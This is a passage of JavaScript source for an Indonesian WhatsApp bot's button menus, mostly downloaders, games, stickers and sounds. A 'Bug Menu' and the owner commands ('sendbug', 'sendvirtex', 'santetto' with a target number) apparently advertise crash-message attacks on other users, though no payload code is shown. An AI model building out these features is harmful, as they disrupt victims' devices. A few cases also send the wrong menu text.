                {title: "𝐒𝐨𝐮𝐧𝐝", rowId: `msoundmenu`, description: `𝐒𝐨𝐮𝐧𝐝 𝐌𝐞𝐧𝐮`},
                {title: "𝐏𝐫𝐞𝐦𝐢𝐮𝐦", rowId: `mpremium`, description: `𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐌𝐞𝐧𝐮`},
                {title: "𝐎𝐰𝐧𝐞𝐫", rowId: `mowner`, description: `𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮`}
                ]
                },
                ]
                danta.sendListMsg(m.chat, kukiw, nyoutube, `*𝑯𝒂𝒊 𝑲𝒂𝒌 ${pushname}*!`, `𝐒𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐏𝐢𝐥𝐢𝐡 𝐌𝐞𝐧𝐮𝐧𝐲𝐚 𝐊𝐚𝐤`, sections, m, {quoted: fkontak})
            }
            break
            case 'mgroup': {
            
goup = `*𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}linkgroup
╠➥ ${prefix}ephemeral [option]
╠➥ ${prefix}setppgc [image]
╠➥ ${prefix}setname [text]
╠➥ ${prefix}setdesc [text]
╠➥ ${prefix}group [option]
╠➥ ${prefix}editinfo [option]
╠➥ ${prefix}add @user
╠➥ ${prefix}kick @user
╠➥ ${prefix}hidetag [text]
╠➥ ${prefix}tagall [text]
╠➥ ${prefix}antilink [on/off]
╠➥ ${prefix}mute [on/off]
╠➥ ${prefix}promote @user
╠➥ ${prefix}demote @user
╠➥ ${prefix}vote [text]
╠➥ ${prefix}devote
╠➥ ${prefix}upvote
╠➥ ${prefix}cekvote
╠➥ ${prefix}hapusvote
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, goup, nyoutube, m, {quoted: fkontak})
            }
            break
      case 'mwebzone': {
wbzone = `*𝐖𝐞𝐛𝐳𝐨𝐧𝐞 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}playstore
╠➥ ${prefix}gsmarena
╠➥ ${prefix}jadwalbioskop
╠➥ ${prefix}nowplayingbioskop
╠➥ ${prefix}aminio
╠➥ ${prefix}wattpad
╠➥ ${prefix}webtoons
╠➥ ${prefix}drakor
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, wbzone, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mdownloader': {
dwnloader = `*𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}tiktoknowm [url]
╠➥ ${prefix}tiktokwm [url]
╠➥ ${prefix}tiktokmp3 [url]
╠➥ ${prefix}instagram [url]
╠➥ ${prefix}twitter [url]
╠➥ ${prefix}twittermp3 [url]
╠➥ ${prefix}facebook [url]
╠➥ ${prefix}pinterestdl [url]
╠➥ ${prefix}ytmp3 [url]
╠➥ ${prefix}ytmp4 [url]
╠➥ ${prefix}getmusic [query]
╠➥ ${prefix}getvideo [query]
╠➥ ${prefix}umma [url]
╠➥ ${prefix}joox [query]
╠➥ ${prefix}soundcloud [url]
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, dwnloader, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'msearch': {
sarch = `*𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}play [query]
╠➥ ${prefix}yts [query]
╠➥ ${prefix}google [query]
╠➥ ${prefix}gimage [query]
╠➥ ${prefix}pinterest [query]
╠➥ ${prefix}wallpaper [query]
╠➥ ${prefix}wikimedia [query]
╠➥ ${prefix}ytsearch [query]
╠➥ ${prefix}ringtone [query]
╠➥ ${prefix}stalk [option] [query]
╠➥ ${prefix}wallpaper [query]
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, sarch, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mrandom': {
rndom = `*𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}gbtku
╠➥ ${prefix}coffe
╠➥ ${prefix}quotesanime
╠➥ ${prefix}motivasi
╠➥ ${prefix}dilanquote
╠➥ ${prefix}bucinquote
╠➥ ${prefix}katasenja
╠➥ ${prefix}puisi
╠➥ ${prefix}couple
╠➥ ${prefix}anime
╠➥ ${prefix}waifu
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, rndom, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mcerpen': {
crpen = `*𝐂𝐞𝐫𝐩𝐞𝐧 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}Cerpen Anak
╠➥ ${prefix}Cerpen Budaya
╠➥ ${prefix}Cerpen Cinta
╠➥ ${prefix}Cerpen Cinta Islami
╠➥ ${prefix}Cerpen Cinta Pertama
╠➥ ${prefix}Cerpen Cinta Romantis
╠➥ ${prefix}Cerpen Cinta Sedih
╠➥ ${prefix}Cerpen Cinta Segitiga
╠➥ ${prefix}Cerpen Cinta Sejati
╠➥ ${prefix}Cerpen Galau
╠➥ ${prefix}Cerpen Gokil
╠➥ ${prefix}Cerpen Inspiratif
╠➥ ${prefix}Cerpen Jepang
╠➥ ${prefix}Cerpen Kehidupan
╠➥ ${prefix}Cerpen Keluarga
╠➥ ${prefix}Cerpen Kisah Nyata
╠➥ ${prefix}Cerpen Korea
╠➥ ${prefix}Cerpen Kristen
╠➥ ${prefix}Cerpen Liburan
╠➥ ${prefix}Cerpen Lingkungan
╠➥ ${prefix}Cerpen Lucu
╠➥ ${prefix}Cerpen Malaysia
╠➥ ${prefix}Cerpen Mengharukan
╠➥ ${prefix}Cerpen Misteri
╠➥ ${prefix}Cerpen Motivasi
╠➥ ${prefix}Cerpen Nasihat
╠➥ ${prefix}Cerpen Nasionalisme
╠➥ ${prefix}Cerpen Bahasa Daerah
╠➥ ${prefix}Cerpen Bahasa Inggris
╠➥ ${prefix}Cerpen Bahasa Jawa
╠➥ ${prefix}Cerpen Bahasa Sunda
╠➥ ${prefix}Cerpen Olahraga
╠➥ ${prefix}Cerpen Patah Hati
╠➥ ${prefix}Cerpen Penantian
╠➥ ${prefix}Cerpen Pendidikan
╠➥ ${prefix}Cerpen Pengalaman Pribadi
╠➥ ${prefix}Cerpen Pengorbanan
╠➥ ${prefix}Cerpen Penyesalan
╠➥ ${prefix}Cerpen Perjuangan
╠➥ ${prefix}Cerpen Perpisahan
╠➥ ${prefix}Cerpen Persahabatan
╠➥ ${prefix}Cerpen Petualangan
╠➥ ${prefix}Cerpen Ramadhan
╠➥ ${prefix}Cerpen Remaja
╠➥ ${prefix}Cerpen Renungan
╠➥ ${prefix}Cerpen Rindu
╠➥ ${prefix}Cerpen Rohani
╠➥ ${prefix}Cerpen Romantis
╠➥ ${prefix}Cerpen Sastra
╠➥ ${prefix}Cerpen Sedih
╠➥ ${prefix}Cerpen Sejarah
╠➥ ${prefix}Cerpen Slice Of Life
╠➥ ${prefix}Cerpen Terjemahan
╠➥ ${prefix}Cerpen Thriller

`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, sarch, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mbugmenu': {
mbug = `*𝐁𝐮𝐠 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}co
╠➥ ${prefix}cu
╠➥ ${prefix}ci
╠➥ ${prefix}ca
╠➥ ${prefix}bugstik
╠➥ ${prefix}bugvn
╠➥ ${prefix}bro
╠➥ ${prefix}lokas
╠➥ ${prefix}bugbcimage
╠➥ ${prefix}santetdia
╠➥ ${prefix}santetgc
╠➥ ${prefix}bugie
╠➥ ${prefix}jadibug1
╠➥ ${prefix}jadibug2
╠➥ ${prefix}jadibug3
╠➥ ${prefix}jadibug4
╠➥ ${prefix}jadibug5
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, sarch, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mtextpro': {
txtpro = `*𝐓𝐞𝐱𝐭 𝐏𝐫𝐨 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}3dchristmas
╠➥ ${prefix}3ddeepsea
╠➥ ${prefix}americanflag
╠➥ ${prefix}3dscifi
╠➥ ${prefix}3drainbow
╠➥ ${prefix}3dwaterpipe
╠➥ ${prefix}halloweenskeleton
╠➥ ${prefix}sketch
╠➥ ${prefix}bluecircuit
╠➥ ${prefix}space
╠➥ ${prefix}metallic
╠➥ ${prefix}fiction
╠➥ ${prefix}greenhorror
╠➥ ${prefix}transformer
╠➥ ${prefix}berry
╠➥ ${prefix}thunder
╠➥ ${prefix}magma
╠➥ ${prefix}3dcrackedstone
╠➥ ${prefix}3dneonlight
╠➥ ${prefix}impressiveglitch
╠➥ ${prefix}naturalleaves
╠➥ ${prefix}fireworksparkle
╠➥ ${prefix}matrix
╠➥ ${prefix}dropwater
╠➥ ${prefix}harrypotter
╠➥ ${prefix}foggywindow
╠➥ ${prefix}neondevils
╠➥ ${prefix}christmasholiday
╠➥ ${prefix}3dgradient
╠➥ ${prefix}blackpink
╠➥ ${prefix}gluetext
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, txtpro, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mphotooxy': {
potooxy = `*𝐏𝐡𝐨𝐭𝐨 𝐎𝐱𝐲 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}shadow
╠➥ ${prefix}romantic
╠➥ ${prefix}smoke
╠➥ ${prefix}burnpapper
╠➥ ${prefix}naruto
╠➥ ${prefix}wanted
╠➥ ${prefix}gayeffect
╠➥ ${prefix}lovemsg
╠➥ ${prefix}grassmsg
╠➥ ${prefix}lovetext
╠➥ ${prefix}coffecup
╠➥ ${prefix}butterfly
╠➥ ${prefix}harrypotter
╠➥ ${prefix}retrolol
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, potooxy, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mephoto': {
ehoto = `*𝐄𝐩𝐡𝐨𝐭𝐨 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}ffcover
╠➥ ${prefix}crossfire
╠➥ ${prefix}galaxy
╠➥ ${prefix}glass
╠➥ ${prefix}neon
╠➥ ${prefix}beach
╠➥ ${prefix}blackpink
╠➥ ${prefix}igcertificate
╠➥ ${prefix}ytcertificate
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, ehoto, nyoutube, m, {quoted: fkontak})
            }
            break
           case 'mfun': {
mun = `*𝐅𝐮𝐧 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}simih
╠➥ ${prefix}halah
╠➥ ${prefix}hilih
╠➥ ${prefix}huluh
╠➥ ${prefix}heleh
╠➥ ${prefix}holoh
╠➥ ${prefix}jadian
╠➥ ${prefix}jodohku
╠➥ ${prefix}apakah
╠➥ ${prefix}bisakah
╠➥ ${prefix}kapan
╠➥ ${prefix}slot
╠➥ ${prefix}delttt
╠➥ ${prefix}tictactoe
╠➥ ${prefix}family100
╠➥ ${prefix}tebak [option]
╠➥ ${prefix}math [mode]
╠➥ ${prefix}suitpvp [@tag]
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, mun, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mprimbon': {
pimbon = `*𝐏𝐫𝐢𝐦𝐛𝐨𝐧 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}nomorhoki
╠➥ ${prefix}artimimpi
╠➥ ${prefix}artinama
╠➥ ${prefix}ramaljodoh
╠➥ ${prefix}ramaljodohbali
╠➥ ${prefix}suamiistri
╠➥ ${prefix}ramalcinta
╠➥ ${prefix}cocoknama
╠➥ ${prefix}pasangan
╠➥ ${prefix}jadiannikah
╠➥ ${prefix}sifatusaha
╠➥ ${prefix}rezeki
╠➥ ${prefix}pekerjaan
╠➥ ${prefix}nasib
╠➥ ${prefix}penyakit
╠➥ ${prefix}tarot
╠➥ ${prefix}fengshui
╠➥ ${prefix}haribaik
╠➥ ${prefix}harisangar
╠➥ ${prefix}harisial
╠➥ ${prefix}nagahari
╠➥ ${prefix}arahrezeki
╠➥ ${prefix}peruntungan
╠➥ ${prefix}weton
╠➥ ${prefix}karakter
╠➥ ${prefix}keberuntungan
╠➥ ${prefix}memancing
╠➥ ${prefix}masasubur
╠➥ ${prefix}zodiak
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, pimbon, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mconvert': {
cnvert = `*𝐂𝐨𝐧𝐯𝐞𝐫𝐭 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}attp
╠➥ ${prefix}ttp
╠➥ ${prefix}toimage
╠➥ ${prefix}removebg
╠➥ ${prefix}gura
╠➥ ${prefix}patrick
╠➥ ${prefix}sanime
╠➥ ${prefix}doge
╠➥ ${prefix}paimon
╠➥ ${prefix}lu
╠➥ ${prefix}lovesticker
╠➥ ${prefix}sticker
╠➥ ${prefix}emojimix
╠➥ ${prefix}emojimix2
╠➥ ${prefix}tovideo
╠➥ ${prefix}togif
╠➥ ${prefix}tourl
╠➥ ${prefix}tovn
╠➥ ${prefix}tomp3
╠➥ ${prefix}toaudio
╠➥ ${prefix}ebinary
╠➥ ${prefix}dbinary
╠➥ ${prefix}styletext
╠➥ ${prefix}smeme
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, cnvert, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mmain': {
min = `*𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}ping
╠➥ ${prefix}owner
╠➥ ${prefix}report
╠➥ ${prefix}delete
╠➥ ${prefix}infochat
╠➥ ${prefix}quoted
╠➥ ${prefix}listpc
╠➥ ${prefix}listgc
╠➥ ${prefix}listonline
╠➥ ${prefix}speedtest
╠➥ ${prefix}menfes
╠➥ ${prefix}tinyurl
╠➥ ${prefix}isgd
╠➥ ${prefix}vurl
╠➥ ${prefix}clp
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, min, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mdatabase': {
dtbase = `*𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}setcmd
╠➥ ${prefix}listcmd
╠➥ ${prefix}delcmd
╠➥ ${prefix}lockcmd
╠➥ ${prefix}addmsg
╠➥ ${prefix}listmsg
╠➥ ${prefix}getmsg
╠➥ ${prefix}delmsg
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, dtbase, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'manonymous': {
aonymous = `*𝐀𝐧𝐨𝐧𝐲𝐦𝐨𝐮𝐬 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}anonymous
╠➥ ${prefix}start
╠➥ ${prefix}next
╠➥ ${prefix}keluar
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, aonymous, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'minternetmenu': {
internetmenu = `*𝒊𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝒎𝒆𝒏𝒖*
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
    *Internet Menu*
    
╠➥ ${prefix}internetmenu
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, islmic, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mislamic': {
islmic = `*𝐈𝐬𝐥𝐚𝐦𝐢𝐜 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}iqra
╠➥ ${prefix}hadist
╠➥ ${prefix}alquran
╠➥ ${prefix}juzamma
╠➥ ${prefix}tafsirsurah
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, islmic, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mvoice': {
vice = `*𝐕𝐨𝐢𝐜𝐞 𝐂𝐡𝐚𝐧𝐠𝐞𝐫*

╠➥ ${prefix}bass
╠➥ ${prefix}blown
╠➥ ${prefix}deep
╠➥ ${prefix}earrape
╠➥ ${prefix}fast
╠➥ ${prefix}fat
╠➥ ${prefix}nightcore
╠➥ ${prefix}reverse
╠➥ ${prefix}robot
╠➥ ${prefix}slow
╠➥ ${prefix}tupai
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, vice, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mowner': {
oner = `*𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}react [emoji]
╠➥ ${prefix}chat [option]
╠➥ ${prefix}join [link]
╠➥ ${prefix}addprem
╠➥ ${prefix}delprem
╠➥ ${prefix}listprem
╠➥ ${prefix}leave
╠➥ ${prefix}block @user
╠➥ ${prefix}unblock @user
╠➥ ${prefix}setppbot [image]
╠➥ ${prefix}setexif
╠➥ ${prefix}setmenu [option]
╠➥ ${prefix}troli [ danger ]
╠➥ ${prefix}sendbug [no target]
╠➥ ${prefix}virtexto [no target]
╠➥ ${prefix}create [nama grup]
╠➥ ${prefix}sendvirtex [no target]
╠➥ ${prefix}momoto [no target]
╠➥ ${prefix}helloto [no target]
╠➥ ${prefix}virkon [no target]
╠➥ ${prefix}santetto [no target]
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: 'Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: 'List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: 'Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, oner, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mpremium': {
sarch = `*𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐌𝐞𝐧𝐮*

╠➥ ${prefix}meme2
╠➥ ${prefix}tribun
╠➥ ${prefix}pantun
`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: 'Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: 'List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: 'Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, sarch, nyoutube, m, {quoted: fkontak})
            }
            break
case 'msoundmenu': {
sarch = `*𝐒𝐨𝐮𝐧𝐝 𝐌𝐞𝐧𝐮*
╠➥ ${prefix}sound1
╠➥ ${prefix}sound2
╠➥ ${prefix}sound3
╠➥ ${prefix}sound4
╠➥ ${prefix}sound5
╠➥ ${prefix}sound6
╠➥ ${prefix}sound7
╠➥ ${prefix}sound8
╠➥ ${prefix}sound9
╠➥ ${prefix}sound10
╠➥ ${prefix}sound11
╠➥ ${prefix}sound12
╠➥ ${prefix}sound13
╠➥ ${prefix}sound14
╠➥ ${prefix}sound15
╠➥ ${prefix}sound16
╠➥ ${prefix}sound17
╠➥ ${prefix}sound18
╠➥ ${prefix}sound19
╠➥ ${prefix}sound20
╠➥ ${prefix}sound21
╠➥ ${prefix}sound22
╠➥ ${prefix}sound23
╠➥ ${prefix}sound24
╠➥ ${prefix}sound25
╠➥ ${prefix}sound26
╠➥ ${prefix}sound27
╠➥ ${prefix}sound28
╠➥ ${prefix}sound29
╠➥ ${prefix}sound30
╠➥ ${prefix}sound31
╠➥ ${prefix}sound32
╠➥ ${prefix}sound33
╠➥ ${prefix}sound34
╠➥ ${prefix}sound35
╠➥ ${prefix}sound36
╠➥ ${prefix}sound37
╠➥ ${prefix}sound38
╠➥ ${prefix}sound39
╠➥ ${prefix}sound40
╠➥ ${prefix}sound41
╠➥ ${prefix}sound42
╠➥ ${prefix}sound43
╠➥ ${prefix}sound44
╠➥ ${prefix}sound45
╠➥ ${prefix}sound46
╠➥ ${prefix}sound47
╠➥ ${prefix}sound48
╠➥ ${prefix}sound49
╠➥ ${prefix}sound50
╠➥ ${prefix}sound51
╠➥ ${prefix}sound52
╠➥ ${prefix}sound53
╠➥ ${prefix}sound54
╠➥ ${prefix}sound55
╠➥ ${prefix}sound56
╠➥ ${prefix}sound57
╠➥ ${prefix}sound58
╠➥ ${prefix}sound59
╠➥ ${prefix}sound60
╠➥ ${prefix}sound61
╠➥ ${prefix}sound62
╠➥ ${prefix}sound63
╠➥ ${prefix}sound64
╠➥ ${prefix}sound65
╠➥ ${prefix}sound66
╠➥ ${prefix}sound67
╠➥ ${prefix}sound68
╠➥ ${prefix}sound69
╠➥ ${prefix}sound70
╠➥ ${prefix}sound71
╠➥ ${prefix}sound72
╠➥ ${prefix}sound73
╠➥ ${prefix}sound74
╠➥ ${prefix}sound75
╠➥ ${prefix}sound76
╠➥ ${prefix}sound77
╠➥ ${prefix}sound78
╠➥ ${prefix}sound79
╠➥ ${prefix}sound80
╠➥ ${prefix}sound81
╠➥ ${prefix}sound82
╠➥ ${prefix}sound83
╠➥ ${prefix}sound84
╠➥ ${prefix}sound85
╠➥ ${prefix}sound86
╠➥ ${prefix}sound87
╠➥ ${prefix}sound88
╠➥ ${prefix}sound89
╠➥ ${prefix}sound90
╠➥ ${prefix}sound91
╠➥ ${prefix}sound92
╠➥ ${prefix}sound93
╠➥ ${prefix}sound94
╠➥ ${prefix}sound95
╠➥ ${prefix}sound96
╠➥ ${prefix}sound97
╠➥ ${prefix}sound98
╠➥ ${prefix}sound99
╠➥ ${prefix}sound100
╠➥ ${prefix}sound101
╠➥ ${prefix}sound102
╠➥ ${prefix}sound103
╠➥ ${prefix}sound104
╠➥ ${prefix}sound105
╠➥ ${prefix}sound106
╠➥ ${prefix}sound107
╠➥ ${prefix}sound108
╠➥ ${prefix}sound109
╠➥ ${prefix}sound110
╠➥ ${prefix}sound111
╠➥ ${prefix}sound112
╠➥ ${prefix}sound113
╠➥ ${prefix}sound114
╠➥ ${prefix}sound115
╠➥ ${prefix}sound116
╠➥ ${prefix}sound117
╠➥ ${prefix}sound118
╠➥ ${prefix}sound119
╠➥ ${prefix}sound120
╠➥ ${prefix}sound121
╠➥ ${prefix}sound122
╠➥ ${prefix}sound123
╠➥ ${prefix}sound124
╠➥ ${prefix}sound125
╠➥ ${prefix}sound126
╠➥ ${prefix}sound127
╠➥ ${prefix}sound128
╠➥ ${prefix}sound129
╠➥ ${prefix}sound130
╠➥ ${prefix}sound131
╠➥ ${prefix}sound132
╠➥ ${prefix}sound133
╠➥ ${prefix}sound134
╠➥ ${prefix}sound135
╠➥ ${prefix}sound136
╠➥ ${prefix}sound137
╠➥ ${prefix}sound138
╠➥ ${prefix}sound139
╠➥ ${prefix}sound140
╠➥ ${prefix}sound141
╠➥ ${prefix}sound142
╠➥ ${prefix}sound143
╠➥ ${prefix}sound144
╠➥ ${prefix}sound145
╠➥ ${prefix}sound146
╠➥ ${prefix}sound147
╠➥ ${prefix}sound148
╠➥ ${prefix}sound149
╠➥ ${prefix}sound150
╠➥ ${prefix}sound151
╠➥ ${prefix}sound152
╠➥ ${prefix}sound153
╠➥ ${prefix}sound154
╠➥ ${prefix}sound155
╠➥ ${prefix}sound156
╠➥ ${prefix}sound157
╠➥ ${prefix}sound158
╠➥ ${prefix}sound159
╠➥ ${prefix}sound160
╠➥ ${prefix}sound161
`

let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: 'Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: 'List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: 'Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, sarch, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'allmenu': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            danta.sendMessage(m.chat, {audio: fs.readFileSync('./src/sound22.mp3'), mimetype: 'audio/mpeg', ptt:true })
            let ments = [ownernya, me, ini_mark]
                anu = `*${ucapanWaktu}*\n*kak @${me.split('@')[0]}*\n*Powered*  : @${ini_mark.split('@')[0]}\n*Creator* : @${ownernya.split('@')[0]}
                
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 

  *Group Menu*

╠➥ ${prefix}linkgroup
╠➥ ${prefix}ephemeral [option]
╠➥ ${prefix}setppgc [image]
╠➥ ${prefix}setname [text]
╠➥ ${prefix}setdesc [text]
╠➥ ${prefix}group [option]
╠➥ ${prefix}editinfo [option]
╠➥ ${prefix}add @user
╠➥ ${prefix}kick @user
╠➥ ${prefix}hidetag [text]
╠➥ ${prefix}tagall [text]
╠➥ ${prefix}antilink [on/off]
╠➥ ${prefix}mute [on/off]
╠➥ ${prefix}promote @user
╠➥ ${prefix}demote @user
╠➥ ${prefix}vote [text]
╠➥ ${prefix}devote
╠➥ ${prefix}upvote
╠➥ ${prefix}cekvote
╠➥ ${prefix}hapusvote
╠➥ ${prefix}
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Webzone Menu*

╠➥ ${prefix}gsmarena
╠➥ ${prefix}jadwalbioskop
╠➥ ${prefix}nowplayingbioskop
╠➥ ${prefix}aminio
╠➥ ${prefix}wattpad
╠➥ ${prefix}webtoons
╠➥ ${prefix}drakor
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Downloader Menu*

╠➥ ${prefix}tiktoknowm [url]
╠➥ ${prefix}tiktokwm [url]
╠➥ ${prefix}tiktokmp3 [url]
╠➥ ${prefix}instagram [url]
╠➥ ${prefix}twitter [url]
╠➥ ${prefix}twittermp3 [url]
╠➥ ${prefix}facebook [url]
╠➥ ${prefix}pinterestdl [url]
